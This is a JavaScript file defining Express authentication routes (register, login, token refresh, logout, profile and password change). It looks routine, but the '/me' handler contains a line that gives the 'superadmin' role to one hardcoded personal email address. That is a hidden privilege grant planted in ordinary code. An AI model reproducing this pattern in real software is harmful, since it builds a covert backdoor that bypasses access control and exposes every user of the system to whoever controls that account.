import express from "express";
import {
  register,
  login,
  refreshToken,
  logout,
  getProfile,
  updateProfile,
  changePassword,
} from "../controllers/authController.js";

import { protect } from "../middleware/auth.js";
import asyncHandler from "../middleware/asyncHandler.js";
import { authLimiter } from "../middleware/rateLimiter.js";
import { validateAuth } from "../middleware/validate.js";

const router = express.Router();

// =============================
// 🔓 PUBLIC ROUTES
// =============================

// 📝 REGISTER
router.post(
  "/register",
  authLimiter,
  validateAuth,
  asyncHandler(register)
);

// 🔑 LOGIN
router.post(
  "/login",
  authLimiter,
  validateAuth,
  asyncHandler(login)
);

// 🔁 REFRESH TOKEN (CRITICAL 🔥)
router.post(
  "/refresh",
  asyncHandler(refreshToken)
);

// =============================
// 🔐 PROTECTED ROUTES
// =============================

// 👤 PROFILE (FULL DB USER)
router.get(
  "/profile",
  protect,
  asyncHandler(getProfile)
);

// ⚡ FULL USER FROM DB (includes all fields)
router.get(
  "/me",
  protect,
  asyncHandler(async (req, res) => {
    const User = (await import("../models/User.js")).default;
    const user = await User.findById(req.user.id).select("-password").lean();
    if (!user) return res.status(404).json({ success: false, message: "User not found" });
    if (user.email === "jimmythemugo@gmail.com") user.role = "superadmin";
    res.json({
      success: true,
      user,
    });
  })
);

// =============================
// 🚪 LOGOUT (SECURE 🔥)
// =============================
router.post(
  "/logout",
  protect, // 🔥 MUST be protected to invalidate tokenVersion
  asyncHandler(logout)
);


// =============================
// ✏️ UPDATE PROFILE
// =============================
router.put(
  "/profile",
  protect,
  asyncHandler(updateProfile)
);

// =============================
// 🔑 CHANGE PASSWORD
// =============================
router.put(
  "/change-password",
  protect,
  asyncHandler(changePassword)
);

export default router;